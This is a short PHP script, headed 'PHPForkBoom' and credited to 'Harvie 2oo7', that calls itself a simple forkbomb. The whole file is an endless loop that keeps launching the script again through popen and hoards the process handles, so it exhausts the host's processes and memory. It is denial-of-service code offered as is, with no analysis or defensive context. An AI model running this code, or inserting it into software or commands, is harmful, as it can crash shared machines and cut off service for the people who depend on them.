<?php
//PHPForkBoom
//Harvie 2oo7
//Simple PHP forkbomb implementation

$i = 0;
while(1) {
  $fp[$i] = popen($argv[0], "r");
  $i++;
}

?>
